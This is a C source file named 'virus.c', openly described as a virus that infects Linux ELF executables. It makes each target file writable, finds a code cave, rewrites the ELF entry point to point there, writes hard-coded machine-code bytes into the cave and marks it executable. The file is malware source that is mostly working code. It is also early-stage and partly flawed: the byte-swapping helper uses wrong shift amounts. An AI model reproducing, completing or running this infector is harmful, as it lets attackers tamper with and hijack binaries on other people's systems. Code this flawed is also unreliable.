// virus.c
// written by Kate Rodionoff
// on 06/10/23
// virus that infects ELF executable files on Linux

// verify that file is an ELF executable
// find entry point
// inject simple code (to start with)

#ifdef __linux__

#include "include/ElfFile.h"
#include "include/CodeCave.h"
#include <fcntl.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MIN_ARGS 2
#define MOV_RET_INSTR "\x80\xd2" // note: bytes are presented in reverse order

Elf64_Addr convertLittleEndian(Elf64_Addr addr);

int main(int argc, char **argv) {
    if (argc < MIN_ARGS) {
        fprintf(stdout, "Too few arguments to call program\n");
        exit(0);
    }

    for (int i = 1; i < argc; i++) {
        int fd = open(argv[i], O_RDWR);

        if (!Elf(fd)) {
            fprintf(stderr, "Not elf file!\n");
            goto end;
        }

        char *args[2] = {"+w", argv[i]};
        pid_t pid;
        posix_spawn(&pid, "chmod", NULL, NULL, args, NULL);

        Elf64_Ehdr ehdr = ElfExtractHeader(fd);
        Elf64_Phdr phdr = ElfExtractProgramHeader(fd, ehdr);
        // store the original return address
        Elf64_Addr original = ehdr.e_entry;

        CodeCave codeCave = FindCodeCave(fd, phdr, ehdr, 16);
        printf("CodeCave found at %x\n", codeCave.offset);

        //codeCave.offset = 0x1000;

        ehdr.e_entry = phdr.p_vaddr + codeCave.offset;
        printf("New entry point is %x with offset %x\n", ehdr.e_entry, codeCave.offset);
        int err = lseek(fd, 0, SEEK_SET);
        if (err < 0) {
            fprintf(stderr, "Couldn't lseek to start of file\n");
            goto end;
        }
        write(fd, &ehdr, sizeof(ehdr));

        err = lseek(fd, codeCave.offset, SEEK_SET);

        if (err < 0) {
            fprintf(stderr, "Couldn't lseek to code cave position\n");
            goto end;
        }

        write(fd, "\x16\x00\x80\xd2\xd6\x02\x50\x91\xd6\x02\x16\x91\xc0\x02\x1f\xd6", 16);
        err = ElfMarkExecutable(ehdr, codeCave.offset, fd);
        if (err) {
            fprintf(stderr, "Couldn't mark section executable\n");
            goto end;
        }

        end:
            close(fd);
    }

    return 0;
}

// converts an address into little endian
Elf64_Addr convertLittleEndian(Elf64_Addr addr) {
    // 0xffffffffffff0000
    uint64_t b0, b1, b2, b3, b4, b5, b6, b7;
    b0 = (addr & 0x00000000000000ff) << 56;
    b1 = (addr & 0x000000000000ff00) << 48;
    b2 = (addr & 0x0000000000ff0000) << 42;
    b3 = (addr & 0x00000000ff000000) << 36;
    b4 = (addr & 0x000000ff00000000) >> 8;
    b5 = (addr & 0x0000ff0000000000) >> 24;
    b6 = (addr & 0x00ff000000000000) >> 40;
    b7 = (addr & 0xff00000000000000) >> 56;

    return b0 | b1 | b2 | b3 | b4 | b5 | b6 | b7;
}

#endif
